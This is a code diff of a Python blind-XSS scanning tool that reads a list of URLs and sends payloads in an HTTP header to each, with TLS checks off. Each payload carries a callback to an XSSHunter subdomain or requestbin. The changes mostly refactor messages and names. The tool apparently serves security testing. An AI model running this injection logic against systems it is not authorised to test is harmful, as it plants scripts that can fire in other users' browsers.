@@ -1,5 +1,8 @@
 import requests , optparse , concurrent.futures , urllib3
+
 from os import path
+from utils.showOutput import logOutput
+from utils.showOutput import errorOutput
 
 def PayloadsStripper(Payload , Strip):
     if Strip == None or Strip == '':
@@ -31,20 +34,24 @@ def Validation(Options):
         if path.exists(Options.file):
             Config["file"] = Options.file
         else:
-            print("The file you selected: {0}. doesn't exists".format(Options.file)); exit()
+            errorOutput("File not found", "The file you used doesn't exist")
+            exit()
     else:
-        print("You didn't select a file to use with the tool."); exit()
+        errorOutput("Missing argumnets", "You didn't use a file to be used in blinder")
+        exit()
 
     # XSSHunter And Bin Validation 
     if Options.username != None:
         if Options.bin != None:
-            print("You can't use both XSSHunter and ExternalBin."); exit()
+            errorOutput("Arguments error", "You're using both XSShunter and requestbin, you can only use one of them")
+            exit()
         else:
             XSSHunter = "{0}.xss.ht".format(Options.username)
             Config["xsshunter"] = XSSHunter
     else:
         if Options.bin == None:
-            print("Please use your XSSHunter username or use an ExternalBin"); exit()
+            errorOutput("Missing arguments", "You didn't use either XSShunter username or custom requestsbin")
+            exit()
         else:
             Config["bin"] = Options.bin
 
@@ -58,7 +65,8 @@ def Validation(Options):
     if Options.payload != None:
         # The User Selected a Payload
         if Config["replace"] not in Options.payload:
-            print("You didn't add the replace string. use 'XXX' with your payload to replace it with the XSSHunter/Bin"); exit()
+            errorOutput("Missing replace string", "Your payload doesn't contain the replace string `XSS`")
+            exit()
         else:
             Config["payload"] = Options.payload
     else:
@@ -66,10 +74,11 @@ def Validation(Options):
 
     # Redirection Validation
     if Options.redirect != None:
-        if Options.redirect == "allow" or Options.redirect == "deny":
+        if Options.redirect.lower() == "allow" or Options.redirect.lower() == "deny":
             pass
         else:
-            print("You didn't select any valid mode for redirection. the only valid mode is `allow` and `deny`"); exit()
+            errorOutput("Unknown redirection mode", "You used an unknown redirection mode")
+            exit()
     else:
         Config["redirect"] = "allow"
 
@@ -80,29 +89,29 @@ def Validation(Options):
 
     return Config
 
-def Sender(URL , Redirect , Payload , Hunter , Header , Replace):
-    Payload = Payload.replace(Replace , Hunter)
+def Sender(URL , Redirect , payload , Hunter , Header , Replace):
+    payload = payload.replace(Replace , Hunter)
 
     try:
         if Redirect == "allow":
-            Response = requests.get(URL , verify=False , timeout=5 , headers={Header:Payload} , allow_redirects=True)
-            print("\rRequest Has Been Sent To: {0}, Status-Code: {1} , Payload: {2}".format(URL , str(Response.status_code) , Payload))
+            http_response = requests.get(URL , verify=False , timeout=5 , headers={Header:payload} , allow_redirects=True)
+            logOutput(url=URL, code=http_response.status_code, payload=payload)
         else:
-            Response = requests.get(URL , verify=False , timeout=5 , headers={Header:Payload} , allow_redirects=False)
-            print("Request Has Been Sent To: {0}, Status-Code: {1} , Payload: {2}".format(URL , str(Response.status_code) , Payload))
-    except Exception:
-        print("Can't Request This URL: {0}".format(URL))
+            http_response = requests.get(URL , verify=False , timeout=5 , headers={Header:payload} , allow_redirects=False)
+            logOutput(url=URL, code=http_response.status_code, payload=payload)
+    except Exception as e:
+        errorOutput("Can't request this URL", URL)
 
 def CollectOptions():
     Parser = optparse.OptionParser()
-    Parser.add_option("-f" , "--file" , dest="file" , help="The Hosts File You Want To Use")
-    Parser.add_option("-u" , "--username" , dest="username" , help="Your XSSHunter Username")
-    Parser.add_option("-p" , "--payload" , dest="payload" , help="The Payload You Want To Use Instead Of The Default One")
-    Parser.add_option("-b" , "--bin" , dest="bin" , help="Your External Bin You Want To Use To Detect If The Payload Is Fired")
-    Parser.add_option("-r" , "--redirections" , dest="redirect" , help="Redirection Mode To Allow/Disallow Them")
-    Parser.add_option("-s" , "--strip" , dest="strip" , help="The Payload Seprator To Split Them.")
-    Parser.add_option("--replace" , dest="replace" , help="The String Used To Replace It With The Host")
-    Parser.add_option("--header" , dest="header" , help="The Header You Want The Blind Payload To Be Added On.")
+    Parser.add_option("-f" , "--file" , dest="file" , help="Path to the file that contains URLs")
+    Parser.add_option("-u" , "--username" , dest="username" , help="XSShunter username")
+    Parser.add_option("-p" , "--payload" , dest="payload" , help="The custom payload you wanna use")
+    Parser.add_option("-b" , "--bin" , dest="bin" , help="The custom requestbin you wanna use")
+    Parser.add_option("-r" , "--redirections" , dest="redirect" , help="allow/deny redirection")
+    Parser.add_option("-s" , "--strip" , dest="strip" , help="The custom payload stripper")
+    Parser.add_option("--replace" , dest="replace" , help="The custom replace string")
+    Parser.add_option("--header" , dest="header" , help="The custom header you wanna use")
 
     Options , _ = Parser.parse_args()
     return Options
@@ -130,10 +139,10 @@ def Main(Options):
         URL = URL.rstrip("\n")
 
         if _mode == 1:
-            Sender(URL=URL , Redirect=Config["redirection"] , Payload=Config["payload"] , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
+            Sender(URL=URL , Redirect=Config["redirection"] , payload=Config["payload"] , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
         elif _mode == 0:
             for SinglePayload in Payloads:
-                Sender(URL=URL , Redirect=Config["redirection"] , Payload=SinglePayload , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
+                Sender(URL=URL , Redirect=Config["redirection"] , payload=SinglePayload , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
         else:
             pass
 
